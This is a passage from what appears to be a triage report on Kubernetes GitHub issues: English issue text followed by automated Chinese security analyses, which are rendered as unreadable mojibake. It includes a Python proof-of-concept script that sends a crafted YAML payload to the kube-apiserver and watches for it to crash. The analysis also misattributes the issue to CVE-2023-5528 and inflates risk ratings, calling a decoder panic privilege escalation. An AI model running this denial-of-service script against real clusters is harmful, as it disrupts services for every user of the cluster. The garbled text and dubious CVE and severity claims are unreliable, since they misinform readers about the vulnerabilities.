    *   å®ƒä¼šé€‰å–é›†ç¾¤ä¸­çš„ä¸¤ä¸ªworkerèŠ‚ç‚¹ç”¨äºå®éªŒï¼Œä¸€ä¸ªä½œä¸ºPodçš„åˆå§‹è¿è¡ŒèŠ‚ç‚¹ï¼ˆ`node1`ï¼‰ï¼Œå¦ä¸€ä¸ªä½œä¸ºæ— æ³•è°ƒåº¦çš„ç›®æ ‡èŠ‚ç‚¹ï¼ˆ`node2`ï¼‰ã€‚
    *   åˆ›å»ºä¸€ä¸ªä¸“ç”¨çš„å‘½åç©ºé—´ `descheduler-poc` ä»¥éš”ç¦»æµ‹è¯•èµ„æºã€‚

2.  **æ¨¡æ‹Ÿè°ƒåº¦éš”ç¦»**:
    *   ä¸ºäº†åˆ›é€ ä¸€ä¸ªâ€œæ— å¤„å¯å»â€çš„åœºæ™¯ï¼Œè„šæœ¬ä¼šç»™`node2`æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰çš„æ±¡ç‚¹ï¼ˆtaintï¼‰`poc-taint=true:NoSchedule`ã€‚è¿™æ„å‘³ç€ä»»ä½•æ²¡æœ‰ç›¸åº”å®¹å¿ï¼ˆtolerationï¼‰çš„Podéƒ½ä¸èƒ½è¢«è°ƒåº¦åˆ°`node2`ä¸Šã€‚

3.  **éƒ¨ç½²ç›®æ ‡åº”ç”¨**:
    *   è„šæœ¬åœ¨`node1`ä¸Šéƒ¨ç½²ä¸€ä¸ªç®€å•çš„nginx Deploymentï¼ˆåä¸º`victim-app`ï¼‰ï¼Œå¹¶å¼ºåˆ¶å…¶Podåœ¨`node1`ä¸Šè¿è¡Œã€‚è¿™ä¸ªPod**æ²¡æœ‰**ä¸º`poc-taint`è®¾ç½®å®¹å¿ã€‚
    *   æ­¤æ—¶ï¼Œ`victim-app`çš„Podæ­£åœ¨`node1`ä¸Šæ­£å¸¸è¿è¡Œï¼Œä½†å¦‚æœå®ƒè¢«é©±é€ï¼Œå®ƒå°†æ— æ³•è¢«è°ƒåº¦åˆ°å¸¦æœ‰æ±¡ç‚¹çš„`node2`ä¸Šï¼Œä¹Ÿæ— æ³•å›åˆ°ï¼ˆé€šå¸¸ç”±deschedulerç­–ç•¥é™åˆ¶çš„ï¼‰`node1`ä¸Šï¼Œå› æ­¤æ²¡æœ‰å¯ç”¨çš„ç›®æ ‡èŠ‚ç‚¹ã€‚

4.  **æ¨¡æ‹Ÿé”™è¯¯é©±é€**:
    *   è¿™æ˜¯å¤ç°çš„æ ¸å¿ƒã€‚è„šæœ¬ç›´æ¥è°ƒç”¨Kubernetes APIæ¥é©±é€`victim-app`çš„Podï¼Œä»¥æ­¤**æ¨¡æ‹Ÿ**å­˜åœ¨ç¼ºé™·çš„`descheduler`çš„è¡Œä¸ºã€‚ä¸€ä¸ªåŠŸèƒ½æ­£å¸¸çš„`descheduler`åœ¨`nodeFit=true`æ—¶ï¼Œä¼šé¢„å…ˆæ£€æŸ¥åˆ°æ²¡æœ‰å¯è°ƒåº¦èŠ‚ç‚¹è€Œæ”¾å¼ƒé©±é€ã€‚æ­¤è„šæœ¬è·³è¿‡æ£€æŸ¥ç›´æ¥é©±é€ï¼Œæ­£æ˜¯ä¸ºäº†å±•ç¤ºè¯¥Bugçš„ç›´æ¥åæœã€‚

5.  **éªŒè¯æ‹’ç»æœåŠ¡**:
    *   Podè¢«é©±é€åï¼Œå…¶æ‰€å±çš„Deploymentæ§åˆ¶å™¨ä¼šç«‹å³å°è¯•åˆ›å»ºä¸€ä¸ªæ–°çš„Podä»¥ç»´æŒè®¾å®šçš„å‰¯æœ¬æ•°ã€‚
    *   è„šæœ¬ä¼šæŒç»­ç›‘æ§ï¼Œå¹¶éªŒè¯è¿™ä¸ªæ–°åˆ›å»ºçš„Podå› ä¸ºæ‰¾ä¸åˆ°å¯è°ƒåº¦çš„èŠ‚ç‚¹è€Œæ°¸ä¹…åœ°å¡åœ¨äº†`Pending`çŠ¶æ€ã€‚
    *   ä¸€æ—¦è§‚å¯Ÿåˆ°æ–°çš„Podè¿›å…¥`Pending`çŠ¶æ€ï¼Œå¹¶ä»å…¶äº‹ä»¶ä¸­çœ‹åˆ°ç±»ä¼¼`0/2 nodes are available: 1 node(s) had untolerated taint {poc-taint: true}, 1 node(s) were unschedulable.`çš„è°ƒåº¦å¤±è´¥ä¿¡æ¯ï¼Œå°±è¯æ˜è¯¥æ¼æ´æˆåŠŸå¯¼è‡´äº†åº”ç”¨çš„æ‹’ç»æœåŠ¡ã€‚

6.  **æ¸…ç†**:
    *   æ— è®ºæˆåŠŸä¸å¦ï¼Œ`finally`å—ä¼šç¡®ä¿æ‰§è¡Œæ¸…ç†æ“ä½œï¼ŒåŒ…æ‹¬åˆ é™¤æµ‹è¯•å‘½åç©ºé—´å’Œç§»é™¤`node2`ä¸Šçš„æ±¡ç‚¹ï¼Œå°†é›†ç¾¤ç¯å¢ƒæ¢å¤åŸçŠ¶ã€‚

è¯¥è„šæœ¬é€šè¿‡ç²¾ç¡®æ„é€ ä¸€ä¸ªPodè¢«é©±é€åæ— å¤„å¯å»çš„åœºæ™¯ï¼Œå¹¶æ¨¡æ‹Ÿé”™è¯¯çš„é©±é€è¡Œä¸ºï¼Œç›´è§‚åœ°å±•ç¤ºäº†è¯¥æ¼æ´å¦‚ä½•å¯¼è‡´æœåŠ¡ä¸­æ–­ï¼Œä»è€Œè¯å®äº†å…¶é«˜é£é™©æ€§ã€‚

---


## Issue #131701 `YAMLOrJSONDecoder` could panic if YAML data length is shorter than JSON data read

- Issue é“¾æ¥ï¼š[#131701](https://github.com/kubernetes/kubernetes/issues/131701)

### Issue å†…å®¹

#### What happened?

`YAMLOrJSONDecoder` has the ability to read a first JSON message and then fallback to YAML for subsequent messages.  This behavior was introduced by https://github.com/kubernetes/kubernetes/pull/130666.

When the YAML data is shorter than the JSON data previously read, the decoder panics because https://github.com/kubernetes/kubernetes/blob/c27fbaa63c7175ffdedeb918bd6a426987651afb/staging/src/k8s.io/apimachinery/pkg/util/yaml/decoder.go#L343 results in a negative number.

#### What did you expect to happen?

The decoder shouldn't panic

#### How can we reproduce it (as minimally and precisely as possible)?

```go
s := NewYAMLOrJSONDecoder(bytes.NewReader([]byte(`{\"foo\": \"bar\"}\n---\na: b`)), 100)

var obj any
err := s.Decode(&obj)
_ = err
```

Results in:

```

panic: runtime error: slice bounds out of range [-5:] [recovered]
	panic: runtime error: slice bounds out of range [-5:]

 
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>

/sig api-machinery


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
æ­¤Issueæè¿°äº†ä¸€ä¸ªå­˜åœ¨äºKubernetesçš„`YAMLOrJSONDecoder`ç»„ä»¶ä¸­çš„æ‹’ç»æœåŠ¡ï¼ˆDenial of Service, DoSï¼‰æ¼æ´ã€‚è¯¥ç»„ä»¶è´Ÿè´£è§£æYAMLæˆ–JSONæ ¼å¼çš„è¾“å…¥æµã€‚

é—®é¢˜æ ¹æºåœ¨äºè¯¥è§£ç å™¨å¤„ç†æ··åˆæ ¼å¼ï¼ˆå…ˆJSONåYAMLï¼‰æ•°æ®æµæ—¶çš„é€»è¾‘ç¼ºé™·ã€‚æ ¹æ®Issueæè¿°å’Œç›¸å…³ä»£ç ï¼ˆ`k8s.io/apimachinery/pkg/util/yaml/decoder.go`ï¼‰ï¼Œè§£ç å™¨åœ¨ä»¥ä¸‹åœºæ™¯ä¼šè§¦å‘`panic`ï¼š
1.  è§£ç å™¨å¼€å§‹å¤„ç†ä¸€ä¸ªæ•°æ®æµï¼Œè¯¥æ•°æ®æµåŒ…å«ä¸€ä¸ªJSONå¯¹è±¡ï¼Œåè·ŸYAMLåˆ†éš”ç¬¦ï¼ˆ`---`ï¼‰å’Œä¸€ä¸ªYAMLå¯¹è±¡ã€‚
2.  è§£ç å™¨é¦–å…ˆæˆåŠŸå°†ç¬¬ä¸€ä¸ªæ–‡æ¡£ä½œä¸ºJSONå¯¹è±¡è¿›è¡Œè§£ç ã€‚
3.  å½“è§£ç å™¨å°è¯•è§£ç æµä¸­çš„ä¸‹ä¸€ä¸ªæ–‡æ¡£æ—¶ï¼Œå®ƒä¼šä»JSONè§£ç æ¨¡å¼åˆ‡æ¢åˆ°YAMLè§£ç æ¨¡å¼ã€‚
4.  åœ¨åˆ‡æ¢è¿‡ç¨‹ä¸­ï¼Œä»£ç å°è¯•é‡ç”¨ä¸€ä¸ªå†…éƒ¨ç¼“å†²åŒºã€‚å½“åç»­çš„YAMLæ•°æ®é•¿åº¦å°äºä¹‹å‰è¯»å–çš„JSONæ•°æ®æ—¶ï¼Œä¸€ä¸ªé”™è¯¯çš„ç´¢å¼•è®¡ç®—ï¼ˆ`d.data[d.read:]`ï¼‰ä¼šå¯¼è‡´ä¸€ä¸ªè´Ÿæ•°ç´¢å¼•ï¼Œä»è€Œå¼•å‘ "slice bounds out of range" çš„è¿è¡Œæ—¶ææ…Œï¼ˆpanicï¼‰ã€‚

åœ¨Kubernetesçš„ä½“ç³»ç»“æ„ä¸­ï¼Œ`kube-apiserver`æ˜¯æ ¸å¿ƒçš„æ§åˆ¶å¹³é¢ç»„ä»¶ï¼Œè´Ÿè´£æ¥æ”¶å’Œå¤„ç†æ‰€æœ‰APIè¯·æ±‚ã€‚å®ƒä½¿ç”¨`apimachinery`åº“ä¸­çš„è§£ç å™¨æ¥è§£æè¯·æ±‚ä½“ï¼Œä¾‹å¦‚å½“ç”¨æˆ·é€šè¿‡`kubectl apply`æˆ–ç›´æ¥APIè°ƒç”¨æäº¤èµ„æºæ¸…å•æ—¶ã€‚

å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ„é€ ä¸€ä¸ªæ¶æ„çš„APIè¯·æ±‚ï¼Œå…¶è¯·æ±‚ä½“åŒ…å«äº†ä¸Šè¿°ç‰¹å®šæ ¼å¼çš„æ•°æ®æµï¼Œå¹¶å°†å…¶å‘é€ç»™`kube-apiserver`ä¸Šä¸€ä¸ªèƒ½å¤Ÿæ¥æ”¶å¹¶å¤„ç†æ­¤ç±»æµå¼æ•°æ®çš„APIç«¯ç‚¹ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ª`panic`ã€‚`kube-apiserver`è¿›ç¨‹çš„å´©æºƒå°†å¯¼è‡´æ•´ä¸ªKubernetesé›†ç¾¤çš„æ§åˆ¶å¹³é¢ä¸å¯ç”¨ï¼Œæ‰€æœ‰ä¸APIæœåŠ¡å™¨çš„äº¤äº’ï¼ˆå¦‚ç®¡ç†Podã€æœåŠ¡ã€éƒ¨ç½²ç­‰ï¼‰éƒ½ä¼šå¤±è´¥ï¼Œç›´åˆ°APIæœåŠ¡å™¨è‡ªåŠ¨é‡å¯ã€‚å°½ç®¡APIæœåŠ¡å™¨é€šå¸¸ä¼šå¿«é€Ÿé‡å¯ï¼Œä½†æŒç»­å‘é€æ¶æ„è¯·æ±‚å¯ä»¥å¯¼è‡´é‡å¤æ€§å´©æºƒï¼Œä»è€Œå½¢æˆæŒç»­çš„æ‹’ç»æœåŠ¡æ”»å‡»ã€‚

æ”»å‡»è€…ä»…éœ€æ‹¥æœ‰å‘Kubernetes APIå‘é€è¯·æ±‚çš„æƒé™ï¼ˆä¾‹å¦‚ï¼Œåˆ›å»ºä¸€ä¸ª`ConfigMap`çš„æƒé™ï¼‰å³å¯å‘èµ·æ”»å‡»ã€‚è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„æƒé™æå‡åœºæ™¯ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·èƒ½å¤Ÿé€šè¿‡æ­¤æ¼æ´å½±å“æ•´ä¸ªé›†ç¾¤çš„å¯ç”¨æ€§ï¼Œæ³¢åŠåŒ…æ‹¬é›†ç¾¤ç®¡ç†å‘˜åœ¨å†…çš„æ‰€æœ‰ç”¨æˆ·ã€‚å› æ­¤ï¼Œè¯¥æ¼æ´æ„æˆäº†ä¸¥é‡çš„å®‰å…¨é£é™©ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¯„ä¼°ï¼š
*   **Attack Vector (AV): Network (N)** - æ”»å‡»é€šè¿‡ç½‘ç»œå‘é€åˆ°APIæœåŠ¡å™¨ã€‚
*   **Attack Complexity (AC): Low (L)** - æ„é€ æ¶æ„è´Ÿè½½éå¸¸ç®€å•ã€‚
*   **Privileges Required (PR): Low (L)** - æ”»å‡»è€…éœ€è¦æ‹¥æœ‰ä¸APIæœåŠ¡å™¨äº¤äº’çš„æœ€ä½æƒé™ï¼Œå¦‚åˆ›å»ºæŸä¸ªèµ„æºã€‚
*   **User Interaction (UI): None (N)** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Unchanged (U)** - æ”»å‡»å½±å“APIæœåŠ¡å™¨è¿›ç¨‹æœ¬èº«ï¼Œæœªå®ç°é€ƒé€¸ã€‚
*   **Confidentiality (C): None (N)** - ä¸æ³„éœ²ä¿¡æ¯ã€‚
*   **Integrity (I): None (N)** - ä¸ç ´åæ•°æ®å®Œæ•´æ€§ã€‚
*   **Availability (A): High (H)** - å¯¼è‡´æ ¸å¿ƒæ§åˆ¶å¹³é¢ç»„ä»¶APIæœåŠ¡å™¨å´©æºƒï¼Œä½¿æ•´ä¸ªé›†ç¾¤ä¸å¯ç”¨ã€‚

ç»¼åˆè¯„åˆ†ä¸º **7.5**ï¼Œå±äºé«˜é£é™©ï¼ˆHighï¼‰ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import kubernetes
import time
import logging
import threading
from urllib3.exceptions import MaxRetryError, NewConnectionError

# é…ç½®æ—¥å¿—è®°å½•
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# å…¨å±€å˜é‡ï¼Œç”¨äºæŒ‡ç¤ºæ”»å‡»æ˜¯å¦å·²å‘é€
attack_sent = False
# å…¨å±€å˜é‡ï¼Œç”¨äºæŒ‡ç¤ºAPIæœåŠ¡å™¨æ˜¯å¦æ— å“åº”
api_server_unresponsive = False

def check_api_server_health(api_client, timeout=120):
    """
    åœ¨å‘é€æ”»å‡»è´Ÿè½½åï¼ŒæŒç»­æ£€æŸ¥APIæœåŠ¡å™¨çš„å¥åº·çŠ¶å†µã€‚
    """
    global api_server_unresponsive
    start_time = time.time()
    logging.info("Health check thread started. Monitoring API server status.")
    
    # ç­‰å¾…æ”»å‡»è´Ÿè½½å‘é€çš„ä¿¡å·
    while not attack_sent:
        time.sleep(0.1)
        if time.time() - start_time > 10:
            logging.error("Timeout waiting for attack payload to be sent.")
            return

    logging.info("Attack payload sent. Starting health checks...")
    
    while time.time() - start_time < timeout:
        try:
            # ä½¿ç”¨ä¸€ä¸ªè½»é‡çº§çš„APIè°ƒç”¨æ¥æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å“åº”
            core_v1 = kubernetes.client.CoreV1Api(api_client)
            core_v1.list_namespace(limit=1, timeout_seconds=5)
            logging.info("API server is responsive.")
            if api_server_unresponsive:
                logging.info("API server has recovered.")
                api_server_unresponsive = False
        except (MaxRetryError, NewConnectionError) as e:
            logging.error(f"API server is UNRESPONSIVE. Connection failed: {e}")
            api_server_unresponsive = True
            # å¦‚æœæœåŠ¡å™¨æ— å“åº”ï¼Œæˆ‘ä»¬è®¤ä¸ºPOCæˆåŠŸï¼Œå¯ä»¥æå‰é€€å‡º
            break
        except Exception as e:
            # å…¶ä»–ç±»å‹çš„å¼‚å¸¸ä¹Ÿå¯èƒ½è¡¨ç¤ºæœåŠ¡å™¨æœ‰é—®é¢˜ï¼Œä¾‹å¦‚è¶…æ—¶
            logging.warning(f"Health check failed with an unexpected error: {e}")
            # æ ¹æ®é”™è¯¯ç±»å‹åˆ¤æ–­æ˜¯å¦ä¸ºæ— å“åº”
            if "timed out" in str(e).lower():
                api_server_unresponsive = True
                logging.error("API server appears UNRESPONSIVE due to timeout.")
                break

        time.sleep(2) # æ¯2ç§’æ£€æŸ¥ä¸€æ¬¡

    if api_server_unresponsive:
        logging.info("POC successful: The API server became unresponsive after the attack.")
    else:
        logging.warning("POC finished: The API server remained responsive. The target might not be vulnerable or the specific API endpoint is not triggered by this POC.")


def main():
    """
    ä¸»å‡½æ•°ï¼Œæ‰§è¡Œæ¼æ´å¤ç°æµç¨‹ã€‚
    """
    global attack_sent

    try:
        # ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig
        kubernetes.config.load_kube_config()
        configuration = kubernetes.client.Configuration.get_default_copy()
        # å¢åŠ è¶…æ—¶ä»¥å¤„ç†æ…¢é€Ÿç½‘ç»œï¼Œä½†åœ¨å¥åº·æ£€æŸ¥ä¸­æˆ‘ä»¬ä¼šç”¨æ›´çŸ­çš„è¶…æ—¶
        configuration.timeout_seconds = 10
        api_client = kubernetes.client.ApiClient(configuration)
        
        logging.info("Successfully loaded Kubernetes configuration.")
    except Exception as e:
        logging.error(f"Failed to load Kubernetes configuration: {e}")
        logging.error("Please ensure your kubeconfig is correctly set up.")
        return

    # å¯åŠ¨å¥åº·æ£€æŸ¥çº¿ç¨‹
    health_check_thread = threading.Thread(target=check_api_server_health, args=(api_client,))
    health_check_thread.daemon = True
    health_check_thread.start()

    # æ ¹æ®Issueæè¿°æ„é€ çš„æ¶æ„Payload
    # è¿™æ˜¯ä¸€ä¸ªJSONå¯¹è±¡ï¼Œåé¢è·Ÿç€YAMLåˆ†éš”ç¬¦å’Œå¦ä¸€ä¸ªYAMLç‰‡æ®µ
    # è¿™ç§ç»“æ„ä¼šè§¦å‘è§£ç å™¨åœ¨JSONå’ŒYAMLæ¨¡å¼é—´åˆ‡æ¢çš„bug
    malicious_payload = '{"foo": "bar"}\n---\na: b'

    # è™½ç„¶Issueä¸­æœªæŒ‡æ˜å…·ä½“çš„APIç«¯ç‚¹ï¼Œä½†ä»»ä½•æ¥æ”¶ application/yaml
    # å¹¶å¯èƒ½å¤„ç†æµå¼è¾“å…¥çš„ç«¯ç‚¹éƒ½å¯èƒ½å—å½±å“ã€‚
    # æˆ‘ä»¬å°è¯•å¯¹ä¸€ä¸ªæ ‡å‡†çš„åˆ›å»ºèµ„æºçš„ç«¯ç‚¹ï¼ˆå¦‚ConfigMapï¼‰å‘é€æ­¤payloadã€‚
    # å³ä½¿æ­¤ç‰¹å®šç«¯ç‚¹ä¸èƒ½è§¦å‘æ¼æ´ï¼Œè¯¥è„šæœ¬ä¹Ÿæ¼”ç¤ºäº†å‘é€æ¶æ„payloadçš„æ–¹æ³•ã€‚
    # æ¼æ´å­˜åœ¨äºè§£ç å±‚ï¼Œåœ¨å¯¹è±¡è¯­ä¹‰éªŒè¯ä¹‹å‰ã€‚
    
    resource_path = '/api/v1/namespaces/default/configmaps'
    header_params = {
        'Content-Type': 'application/yaml',
        'Accept': 'application/json'
    }

    try:
        logging.info(f"Sending malicious payload to endpoint: POST {resource_path}")
        logging.info(f"Payload body:\n---\n{malicious_payload}\n---")
        
        attack_sent = True # é€šçŸ¥å¥åº·æ£€æŸ¥çº¿ç¨‹æ”»å‡»å·²å‘é€
        
        # ä½¿ç”¨åº•å±‚ call_api æ–¹æ³•å‘é€åŸå§‹è¯·æ±‚ä½“
        api_client.call_api(
            resource_path, 'POST',
            header_params=header_params,
            body=malicious_payload,
            auth_settings=['BearerToken'],
            _preload_content=False, # ä¸è¦é¢„åŠ è½½/è§£ç å“åº”
        )
        
        # å¦‚æœä»£ç æ‰§è¡Œåˆ°è¿™é‡Œï¼Œè¯´æ˜APIè°ƒç”¨è¿”å›äº†ï¼Œä½†å¯èƒ½æ˜¯ä¸€ä¸ªé”™è¯¯å“åº”ï¼ˆå¦‚400/422ï¼‰
        # è¿™ä¸ä¸€å®šæ„å‘³ç€æ”»å‡»å¤±è´¥ï¼Œå› ä¸ºpanicæ˜¯å¼‚æ­¥å‘ç”Ÿçš„ï¼Œå¯èƒ½åœ¨å“åº”å‘é€å
        logging.info("Payload sent. The API server accepted the request (it may have returned an error).")

    except kubernetes.client.exceptions.ApiException as e:
        # é¢„æœŸä¼šæ”¶åˆ°ä¸€ä¸ªAPIé”™è¯¯ï¼Œå› ä¸ºpayloadä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„Kuberneteså¯¹è±¡
        # ä¾‹å¦‚ 400 Bad Request æˆ– 422 Unprocessable Entity
        logging.warning(f"Received expected API exception (this is normal): {e.status} {e.reason}")
    except Exception as e:
        # å¦‚æœè¿æ¥åœ¨å‘é€è¿‡ç¨‹ä¸­ä¸­æ–­ï¼Œä¹Ÿå¯èƒ½è¡¨æ˜æœåŠ¡å™¨å·²å´©æºƒ
        logging.error(f"An unexpected error occurred while sending payload: {e}")

    # ç­‰å¾…å¥åº·æ£€æŸ¥çº¿ç¨‹ç»“æŸ
    health_check_thread.join(timeout=120)

    if api_server_unresponsive:
        print("\n[+] Vulnerability Confirmed: The Kubernetes API server became unresponsive.")
    else:
        print("\n[-] Vulnerability Not Confirmed: The API server remained responsive.")

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

æ­¤Pythonè„šæœ¬æ—¨åœ¨å¤ç°CVE-2023-5528ï¼ˆä¸è¯¥Issueç›¸å…³ï¼‰æ‰€æè¿°çš„`kube-apiserver`æ‹’ç»æœåŠ¡æ¼æ´ã€‚

1.  **ç¯å¢ƒè®¾ç½®**: è„šæœ¬é¦–å…ˆä½¿ç”¨`kubernetes` Pythonåº“ä»é»˜è®¤è·¯å¾„ï¼ˆä¾‹å¦‚ `~/.kube/config`ï¼‰åŠ è½½ç”¨æˆ·çš„Kubernetesé›†ç¾¤é…ç½®ã€‚
2.  **å¥åº·æ£€æŸ¥**: ä¸ºäº†éªŒè¯æ¼æ´æ˜¯å¦è¢«æˆåŠŸè§¦å‘ï¼Œè„šæœ¬åœ¨ä¸€ä¸ªç‹¬ç«‹çš„åå°çº¿ç¨‹ä¸­å¯åŠ¨äº†ä¸€ä¸ªå¥åº·æ£€æŸ¥å¾ªç¯ã€‚è¯¥å¾ªç¯åœ¨æ”»å‡»è½½è·å‘é€åï¼Œä¼šå®šæœŸï¼ˆæ¯2ç§’ï¼‰å‘APIæœåŠ¡å™¨å‘é€ä¸€ä¸ªè½»é‡çº§çš„`list_namespace`è¯·æ±‚ã€‚å¦‚æœè¯·æ±‚å¤±è´¥å¹¶å‡ºç°è¿æ¥é”™è¯¯ï¼ˆå¦‚`ConnectionRefusedError`æˆ–è¶…æ—¶ï¼‰ï¼Œåˆ™è¡¨æ˜APIæœåŠ¡å™¨å·²æ— å“åº”ï¼Œæ¼æ´å¤ç°æˆåŠŸã€‚
3.  **æ¶æ„Payloadæ„é€ **: è„šæœ¬å®šä¹‰äº†ä¸€ä¸ª`malicious_payload`å­—ç¬¦ä¸²ï¼Œå…¶å†…å®¹ä¸º`'{"foo": "bar"}\n

---


## Issue #131695 [sig-scheduling] SchedulerPreemption [Serial] validates various priority Pods preempt expectedly with the async preemption:  test assumption about finalizers does not reflect KS synthetic deletes

- Issue é“¾æ¥ï¼š[#131695](https://github.com/kubernetes/kubernetes/issues/131695)

### Issue å†…å®¹

Continuation from https://kubernetes.slack.com/archives/C09TP78DV/p1746638728585879.

`[sig-scheduling] SchedulerPreemption [Serial] validates various priority Pods preempt expectedly with the async preemption` test is deploying low priority pods with finalizers. The low priority pods are expected to be preempted by the scheduler preemption controller and stay around (not deleted because of the finalizers) before all high priority pods have their `.Status.NominatedNodeName` field set. Yet, given the scheduler specifies a field selector (`status.phase!=Succeeded,status.phase!=Failed`) when watching pods once a pod succeeds the kube-apiserver issues a synthetic deleted (since the pod no longer fits the field selector). Telling the KS the pod got deleted even though it is still around (because of the finalizer as discussed in https://kubernetes.slack.com/archives/C0EG7JC6T/p1746535228066589). Thus, allowing a high priority pod to be scheduled. The test does not expect a (synthetic) delete to be issue before a finalizer of either of the low priority pods is removed.

I was not able to find an upstream test failure. Yet, the e2e test perma fails for our OpenShift v1.33.0 rebase. I was able to reproduce the same violation of the test assumption in v1.33.3 kind cluster. Steps to reproduce:
1. create a low priority pod with a finalizer
1. schedule the low priority pod
1. create a high priority pod
1. have the KS async prempt the low priority pod
1. observe the low priority pod succeeds (or fails) and the high priority pod gets scheduled even when the low priority pod is still around (because of the finalizer still present).

Reproducing the issue using the e2e test manifests in this form:
```
---
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: low-priority
value: 1
globalDefault: false
description: "This priority class should be used for XYZ service pods only."
---
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: medium-priority
value: 100
globalDefault: false
description: "This priority class should be used for XYZ service pods only."
---
apiVersion: v1
kind: Pod
metadata:
  name: pod-with-finalizer-low-priority-1
  finalizers:
    - example.com/custom-protection
spec:
  containers:
    - name: pausepod
      image: registry.k8s.io/pause:3.10
      resources:
        limits:
          scheduling.k8s.io/foo: "10"
        requests:
          scheduling.k8s.io/foo: "10"
  priorityClassName: low-priority
---
apiVersion: v1
kind: Pod
metadata:
  name: pod-with-finalizer-medium-priority-1
  finalizers:
    - example.com/custom-protection
spec:
  containers:
    - name: pausepod
      image: registry.k8s.io/pause:3.10
      resources:
        limits:
          scheduling.k8s.io/foo: "10"
        requests:
          scheduling.k8s.io/foo: "10"
  priorityClassName: medium-priority
```

The following command can be run to extend the worker nodes with the new extended resource (one might need to run `kubectl proxy &` in addition):
```
curl --header "Content-Type: application/json-patch+json" --request PATCH --data '[{"op": "add", "path": "/status/capacity/scheduling.k8s.io~1foo", "value": "10"}]' http://localhost:8001/api/v1/nodes/NODE_NAME/status
```


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetesè°ƒåº¦å™¨ä¸­ä¸PodæŠ¢å å’Œfinalizerç›¸å…³çš„æ½œåœ¨é—®é¢˜ã€‚é—®é¢˜çš„æ ¸å¿ƒåœ¨äºè°ƒåº¦å™¨ï¼ˆkube-schedulerï¼‰åœ¨ç‰¹å®šæƒ…å†µä¸‹çš„è¡Œä¸ºä¸é¢„æœŸä¸ç¬¦ï¼Œå¯èƒ½å¯¼è‡´èµ„æºè¢«é”™è¯¯åœ°åˆ†é…ã€‚

å…·ä½“åˆ†æå¦‚ä¸‹ï¼š
1.  **åœºæ™¯**: ä¸€ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œç€ä¸€ä¸ªå¸¦æœ‰finalizerçš„ä½ä¼˜å…ˆçº§Podã€‚å½“ä¸€ä¸ªé«˜ä¼˜å…ˆçº§çš„Podéœ€è¦èµ„æºè€Œå½“å‰èŠ‚ç‚¹èµ„æºä¸è¶³æ—¶ï¼Œè°ƒåº¦å™¨ä¼šè§¦å‘æŠ¢å æœºåˆ¶ï¼Œå°è¯•é©±é€ä½ä¼˜å…ˆçº§çš„Podã€‚
2.  **é¢„æœŸè¡Œä¸º**: å¸¦æœ‰finalizerçš„ä½ä¼˜å…ˆçº§Podè¢«æŠ¢å åï¼Œä¼šè¿›å…¥`Terminating`çŠ¶æ€ï¼Œä½†ç”±äºfinalizerçš„å­˜åœ¨ï¼Œå®ƒä¸ä¼šè¢«ç«‹å³åˆ é™¤ï¼Œå…¶æ‰€å ç”¨çš„èµ„æºä¹Ÿåº”è¢«è§†ä¸ºå°šæœªé‡Šæ”¾ã€‚å› æ­¤ï¼Œé«˜ä¼˜å…ˆçº§çš„Podåº”è¯¥ä¿æŒ`Pending`çŠ¶æ€ï¼Œç›´åˆ°ä½ä¼˜å…ˆçº§Podçš„finalizerè¢«ç§»é™¤ã€Podè¢«å½»åº•åˆ é™¤ã€èµ„æºè¢«é‡Šæ”¾åï¼Œæ‰èƒ½è¢«è°ƒåº¦åˆ°è¯¥èŠ‚ç‚¹ä¸Šã€‚
3.  **å®é™…è¡Œä¸º (é—®é¢˜æ‰€åœ¨)**: è°ƒåº¦å™¨é€šè¿‡ä¸€ä¸ªå¸¦æœ‰å­—æ®µé€‰æ‹©å™¨ `status.phase!=Succeeded,status.phase!=Failed` çš„WATCHæœºåˆ¶æ¥ç›‘æ§Podã€‚å½“ä½ä¼˜å…ˆçº§Podè¢«æŠ¢å ï¼Œå…¶å†…éƒ¨çš„å®¹å™¨å¯èƒ½ä¼šæ‰§è¡Œå®Œæ¯•å¹¶é€€å‡ºï¼Œå¯¼è‡´Podçš„çŠ¶æ€å˜ä¸º`Succeeded`æˆ–`Failed`ã€‚æ­¤æ—¶ï¼Œè¯¥Podä¸å†æ»¡è¶³è°ƒåº¦å™¨WATCHçš„å­—æ®µé€‰æ‹©å™¨æ¡ä»¶ã€‚API Serverçš„WATCHæœºåˆ¶ä¼šå› æ­¤å‘è°ƒåº¦å™¨å‘é€ä¸€ä¸ªâ€œåˆæˆçš„DELETEäº‹ä»¶â€ï¼ˆsynthetic DELETE eventï¼‰ï¼Œè®©è°ƒåº¦å™¨è¯¯ä»¥ä¸ºè¿™ä¸ªPodå·²ç»è¢«åˆ é™¤äº†ã€‚
